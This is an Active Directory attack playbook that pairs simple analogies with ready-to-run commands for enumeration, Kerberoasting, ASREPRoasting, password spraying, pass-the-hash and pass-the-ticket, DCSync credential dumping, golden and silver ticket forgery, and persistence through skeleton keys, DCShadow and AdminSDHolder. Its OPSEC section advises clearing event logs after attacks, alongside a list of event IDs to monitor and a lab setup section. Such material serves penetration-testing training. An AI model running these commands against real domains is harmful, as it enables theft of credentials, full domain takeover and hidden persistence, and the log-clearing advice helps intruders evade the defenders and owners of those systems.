# Active Directory Enumeration and Attack Playbook

## ELI5: What Is Active Directory?

**The Corporate Phone Book on Steroids**
Imagine a company with 10,000 employees. Active Directory (AD) is like:
- **The building's keycard system**: Controls who can open which doors
- **The org chart**: Shows who reports to whom
- **The phone directory**: Lists everyone and their info
- **The IT help desk**: Manages all passwords and permissions

**Why Attackers Love AD:**
Once you own AD, you own EVERYTHING:
- Every user's password
- Every computer in the company
- Every file share and database
- The ability to be anyone you want

**The Golden Rule:** In AD, trust relationships are like friendship chains. If Alice trusts Bob, and Bob trusts Charlie, then Charlie can potentially access Alice's stuff. Attackers exploit these trust chains.

## Understanding AD Structure

### The Kingdom Analogy
Think of AD like a medieval kingdom:
- **Domain**: The kingdom itself (company.local)
- **Domain Controller (DC)**: The castle keeping all records
- **Users**: Citizens of the kingdom
- **Computers**: Houses in the kingdom
- **Groups**: Guilds with special privileges
- **Admin**: The king who rules everything

### Key Concepts Simplified

**Kerberos**: The kingdom's ID card system
- You show your ID (ticket) to access resources
- The DC is like the DMV issuing IDs
- Stolen ID (ticket) = impersonation

**LDAP**: The kingdom's census database
- Contains all information about everyone
- Like a phonebook + Facebook combined
- We query it to map the kingdom

**SMB**: The kingdom's delivery service
- How files move between computers
- Like FedEx for the corporate network
- Often exposes sensitive data

## The Attack Lifecycle

### Phase 1: Reconnaissance (Mapping the Kingdom)
We're like spies creating a map:
1. **Find all users** - Who works here?
2. **Find all computers** - What systems exist?
3. **Find all groups** - Who has power?
4. **Find relationships** - Who trusts whom?

### Phase 2: Credential Harvesting (Stealing Keys)
Like pickpocketing at scale:
1. **Kerberoasting** - Crack service account passwords
2. **ASREPRoasting** - Attack users without pre-auth
3. **Password Spraying** - Try common passwords
4. **Credential Dumping** - Steal from memory

### Phase 3: Privilege Escalation (Climbing the Ladder)
Moving from peasant to king:
1. **Token Impersonation** - Steal someone's identity
2. **ACL Abuse** - Exploit permission misconfigurations
3. **GPO Abuse** - Modify group policies
4. **Trust Exploitation** - Jump between domains

### Phase 4: Persistence (Becoming Invisible Royalty)
Ensuring permanent access:
1. **Golden Tickets** - Forge any identity forever
2. **Silver Tickets** - Access specific services
3. **Skeleton Keys** - Master password for everything
4. **Shadow Admins** - Hidden admin accounts

## Quick Command Reference

```powershell
# Import PowerView
Import-Module C:\Tools\PowerView.ps1

# Basic enumeration
Get-Domain
Get-DomainUser
Get-DomainComputer
Get-DomainGroup
Get-DomainOU

# Find interesting ACLs
Get-ObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -match "S-1-5-21"}

# Kerberoasting
Get-DomainUser -SPN | Get-DomainSPNTicket

# ASREPRoasting
Get-DomainUser -PreauthNotRequired
```

## PowerView Enumeration

### What Is PowerView?
PowerView is like a Swiss Army knife for AD reconnaissance. Written in PowerShell, it's the attacker's Google for Active Directory - you can search for anything and everything.

**Why PowerView Over Native Commands?**
- **Easier syntax**: `Get-DomainUser` vs complex LDAP queries
- **Better output**: Formatted, filterable results
- **Chained operations**: Pipe commands together
- **Stealth options**: Avoid detection

### Domain Reconnaissance
```powershell
# Get domain information
Get-Domain
Get-Domain -Domain target.local

# Get domain controller
Get-DomainController
Get-DomainController -Domain target.local

# Get forest information
Get-Forest
Get-Forest -Forest target.local

# Get domain trusts
Get-DomainTrust
Get-DomainTrust -Domain target.local
```

### User Enumeration
```powershell
# Get all users
Get-DomainUser
Get-DomainUser -Domain target.local

# Get specific user properties
Get-DomainUser -Identity administrator
Get-DomainUser administrator -Properties *

# Find users with specific properties
Get-DomainUser -AdminCount 1
Get-DomainUser -SPN
Get-DomainUser -PreauthNotRequired
Get-DomainUser -TrustedToAuth

# Get user group membership
Get-DomainGroup -MemberIdentity "john"

# Find users with description field (often contains passwords)
Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}

# Find inactive users
Get-DomainUser -Properties lastlogontimestamp | Where {$_.lastlogontimestamp -lt (Get-Date).AddDays(-90)}
```

### Computer Enumeration
```powershell
# Get all computers
Get-DomainComputer
Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp

# Find specific OS versions
Get-DomainComputer -OperatingSystem "*Server 2016*"
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Find computers where current user has local admin
Find-LocalAdminAccess

# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# Find computers with constrained delegation
Get-DomainComputer -TrustedToAuth
```

### Group Enumeration
```powershell
# Get all groups
Get-DomainGroup
Get-DomainGroup -Domain target.local

# Get members of specific group
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Enterprise Admins"
Get-DomainGroupMember -Identity "Administrators" -Recurse

# Find groups with interesting members
Get-DomainGroup -AdminCount 1
Get-DomainGroup -Properties samaccountname,member | Where {$_.member -like "*admin*"}

# Get groups current user is member of
Get-DomainGroup -MemberIdentity "currentuser"
```

### ACL Enumeration
```powershell
# Get ACLs for specific user
Get-ObjectAcl -Identity "john" -ResolveGUIDs

# Find interesting ACLs
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -match "domain users"}

# Find objects where current user has GenericAll
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs |
    Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} |
    Where-Object {$_.Identity -eq $env:UserName} |
    Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}

# Find who can DCSync
Get-ObjectAcl "DC=target,DC=local" -ResolveGUIDs |
    Where-Object {($_.ActiveDirectoryRights -match 'GenericAll') -or
                  ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

### Share and Session Enumeration
```powershell
# Find shares on domain
Find-DomainShare
Find-DomainShare -CheckShareAccess

# Find interesting files
Find-InterestingDomainShareFile -Include *.txt,*.bat,*.ps1,*.xlsx
Find-InterestingDomainShareFile -Include *password*,*sensitive*

# Get logged on users
Get-NetLoggedon -ComputerName dc01
Get-NetSession -ComputerName dc01

# Hunt for specific user sessions
Invoke-UserHunter -UserName administrator
Invoke-UserHunter -GroupName "Domain Admins"
```

## BloodHound Data Collection

### ELI5: What Is BloodHound?
BloodHound is like Google Maps for Active Directory. Instead of finding the fastest route to McDonald's, it finds the shortest path to Domain Admin. It visualizes the entire AD as a graph where:
- **Nodes** = Users, computers, groups
- **Edges** = Relationships and permissions
- **Paths** = Attack chains to compromise

**The Power of Visualization:**
Imagine trying to understand Facebook by reading a list of everyone's friends. Impossible! But show it as a network diagram, and patterns emerge. BloodHound does this for AD.

### How BloodHound Works
1. **Collection** (SharpHound): Gathers all AD data
2. **Processing**: Builds relationship graphs
3. **Analysis**: Finds attack paths
4. **Visualization**: Shows exploitable routes

### SharpHound Collection
```powershell
# Import SharpHound
Import-Module C:\Tools\SharpHound.ps1

# Run collection (all methods)
Invoke-BloodHound -CollectionMethod All -Domain target.local -ZipFileName loot.zip

# Specific collection methods
Invoke-BloodHound -CollectionMethod DCOnly
Invoke-BloodHound -CollectionMethod Session
Invoke-BloodHound -CollectionMethod LoggedOn

# Stealth options
Invoke-BloodHound -Stealth -CollectionMethod All

# Using SharpHound.exe
.\SharpHound.exe -c all -d target.local
.\SharpHound.exe -c all --zipfilename output.zip --randomizefilenames --prettyjson
```

### BloodHound Queries
```cypher
# Find shortest path to Domain Admin
MATCH (n:User {name:'CURRENTUSER@DOMAIN.LOCAL'}),
      (m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}),
      p=shortestPath((n)-[*1..]->(m))
RETURN p

# Find all Kerberoastable users
MATCH (n:User {hasspn:true}) RETURN n

# Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

# Find users with DCSync rights
MATCH p=(n:User)-[:DCSync]->(d:Domain) RETURN p
```

## Kerberoasting

### ELI5: The Kerberoasting Attack
Imagine a hotel where:
- Room service accounts have passwords
- Anyone can request room service
- The request includes the account's password (encrypted)
- You can take that encrypted password home and crack it

That's Kerberoasting! You request service tickets (which contain password hashes) for service accounts, then crack them offline. No alerts, no logs, completely legitimate requests.

**Why It Works:**
- Service accounts often have weak passwords
- Passwords rarely change (years old)
- Requesting tickets is normal behavior
- Offline cracking = undetectable

### The Attack Process
1. **Find SPNs** (Service Principal Names) - service accounts
2. **Request tickets** - completely legitimate!
3. **Export tickets** - contains password hash
4. **Crack offline** - hashcat/john on your own machine
5. **Profit** - service accounts often have high privileges

### Manual Kerberoasting
```powershell
# Find SPNs
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname

# Request tickets
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db01.target.local:1433"

# Export tickets
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Using PowerView
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat

# Save to file
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv tickets.csv -NoTypeInformation
```

### Automated Tools
```bash
# Using Impacket
python3 GetUserSPNs.py target.local/john:password -dc-ip 10.10.10.100 -request

# Using Rubeus
.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

## ASREPRoasting

### Find and Exploit ASREP Users
```powershell
# Find users with pre-auth disabled
Get-DomainUser -PreauthNotRequired

# Get ASREP hashes with PowerView
Get-DomainUser -PreauthNotRequired | Get-ASREPHash -Format Hashcat

# Using Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Using Impacket
python3 GetNPUsers.py target.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# Crack with hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## Password Spraying

### Safe Password Spraying
```powershell
# Get password policy
Get-DomainPolicy | Select -ExpandProperty SystemAccess

# Create user list
Get-DomainUser | Where {$_.badpwdcount -lt 3} | Select -ExpandProperty samaccountname > users.txt

# Password spray with PowerView
Invoke-DomainPasswordSpray -UserList users.txt -Password "Winter2024!" -Domain target.local

# Using crackmapexec
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success

# Using kerbrute
./kerbrute passwordspray --dc 10.10.10.100 -d target.local users.txt 'Password123!'
```

## Credential Attacks

### Pass-the-Hash
```powershell
# Using Mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:target.local /ntlm:32196B56FFE6F45E294117B91A83F38 /run:powershell.exe

# Using Impacket
python3 psexec.py target.local/administrator@10.10.10.100 -hashes :32196B56FFE6F45E294117B91A83F38

# Using CrackMapExec
crackmapexec smb 10.10.10.100 -u Administrator -H 32196B56FFE6F45E294117B91A83F38 -x "whoami"
```

### Pass-the-Ticket
```powershell
# Export tickets
mimikatz # sekurlsa::tickets /export

# Import ticket
mimikatz # kerberos::ptt ticket.kirbi

# Using Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Check loaded tickets
klist
```

### Overpass-the-Hash
```powershell
# Get NTLM hash
mimikatz # sekurlsa::logonpasswords

# Create TGT with NTLM
mimikatz # sekurlsa::pth /user:Administrator /domain:target.local /ntlm:32196B56FFE6F45E294117B91A83F38 /run:powershell.exe

# In new PowerShell window
klist
dir \\dc01\c$
```

## DCSync Attack

### ELI5: What Is DCSync?
DCSync is like having a master key to the kingdom's vault. Instead of breaking in, you politely ask the Domain Controller to give you everyone's passwords, and it happily complies because you look like another Domain Controller.

**The Replication Trick:**
Domain Controllers replicate data between each other (like backup servers). DCSync pretends to be a DC asking for replication data. The real DC sends over EVERYTHING:
- All password hashes
- All Kerberos keys
- Complete user database

**Requirements:**
You need special permissions (DCSync rights):
- Replicating Directory Changes
- Replicating Directory Changes All
- Usually only Domain Admins have these

### Perform DCSync
```powershell
# Using Mimikatz
mimikatz # lsadump::dcsync /domain:target.local /user:Administrator

# Get all users
mimikatz # lsadump::dcsync /domain:target.local /all

# Using Impacket
python3 secretsdump.py target.local/administrator:password@10.10.10.100

# With hash
python3 secretsdump.py target.local/administrator@10.10.10.100 -hashes :32196B56FFE6F45E294117B91A83F38
```

## Golden/Silver Ticket Attacks

### ELI5: Golden vs Silver Tickets

**Golden Ticket = God Mode**
Imagine you can print your own passport that every country accepts without question. That's a Golden Ticket - you forge authentication tickets that let you be ANYONE, access ANYTHING, forever (until krbtgt password changes).

**Silver Ticket = VIP Pass**
Like having a backstage pass to one specific concert. Silver Tickets give you access to one specific service (like SQL or file shares) but not the whole kingdom.

**The Magic:**
- Kerberos tickets are signed with passwords
- If you know the password (hash), you can forge tickets
- Golden uses krbtgt hash (domain master key)
- Silver uses service account hash

### Golden Ticket Creation
```powershell
# Get krbtgt hash via DCSync
mimikatz # lsadump::dcsync /domain:target.local /user:krbtgt

# Create golden ticket
mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-1234567890-123456789-1234567890 /krbtgt:32196B56FFE6F45E294117B91A83F38 /ptt

# Verify
klist
dir \\dc01\c$
```

### Silver Ticket Creation
```powershell
# Get service account hash
mimikatz # lsadump::dcsync /domain:target.local /user:sqlservice

# Create silver ticket for specific service
mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-1234567890-123456789-1234567890 /target:mssql.target.local /service:MSSQLSvc /rc4:32196B56FFE6F45E294117B91A83F38 /ptt
```

## Persistence Mechanisms

### AdminSDHolder Abuse
```powershell
# Add user to AdminSDHolder ACL
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=target,DC=local' -PrincipalIdentity john -Rights All

# Wait for SDProp (60 minutes) or force it
Invoke-ADSDPropagation

# Check results
Get-DomainUser -AdminCount 1
```

### Skeleton Key
```powershell
# Install skeleton key (requires DA)
mimikatz # misc::skeleton

# Now can authenticate as any user with password "mimikatz"
Enter-PSSession -ComputerName dc01 -Credential target\administrator
# Password: mimikatz
```

### DCShadow
```powershell
# Register fake DC (requires DA)
mimikatz # lsadump::dcshadow /object:john /attribute:primaryGroupID /value:512

# Push changes
mimikatz # lsadump::dcshadow /push
```

## OPSEC Considerations

### Detection Avoidance
1. Use `ldapsearch` over PowerView when possible
2. Limit Kerberoasting to specific accounts
3. Avoid mass password spraying
4. Use selective BloodHound collection
5. Clear event logs after attacks
6. Use living-off-the-land techniques

### Event Log IDs to Monitor
- 4624: Successful logon
- 4625: Failed logon (password spray detection)
- 4768: Kerberos TGT request
- 4769: Kerberos service ticket request
- 4771: Pre-authentication failed (ASREPRoast)
- 4776: NTLM authentication
- 5136: Directory object modification

## Troubleshooting

### Common Issues

**Issue: PowerView commands fail**
```powershell
# Set execution policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Import with bypass
powershell -ep bypass -c "Import-Module .\PowerView.ps1"
```

**Issue: Kerberos tickets not working**
```powershell
# Clear ticket cache
klist purge

# Check time sync
w32tm /query /status

# Sync with DC
w32tm /resync /computer:dc01.target.local
```

**Issue: Access denied during enumeration**
```powershell
# Check current context
whoami /all

# Get new TGT
kinit user@DOMAIN.LOCAL
```

## Lab Setup

### Domain Controller Setup
```powershell
# Install AD DS
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to DC
Install-ADDSForest -DomainName "lab.local" -DomainNetbiosName "LAB" -InstallDns

# Create test users
New-ADUser -Name "SQLService" -ServicePrincipalNames "MSSQLSvc/sql01.lab.local:1433"
New-ADUser -Name "NoPreAuth" -KerberosEncryptionType AES128,AES256,RC4
Set-ADAccountControl -Identity "NoPreAuth" -DoesNotRequirePreAuth $true

# Set up vulnerable delegation
Set-ADComputer -Identity "WEB01" -TrustedForDelegation $true
```

### Attack Tools Setup
```bash
# Clone tools
git clone https://github.com/PowerShellMafia/PowerSploit.git
git clone https://github.com/BloodHoundAD/BloodHound.git

# Install Impacket
pip3 install impacket

# Download Rubeus
wget https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe
```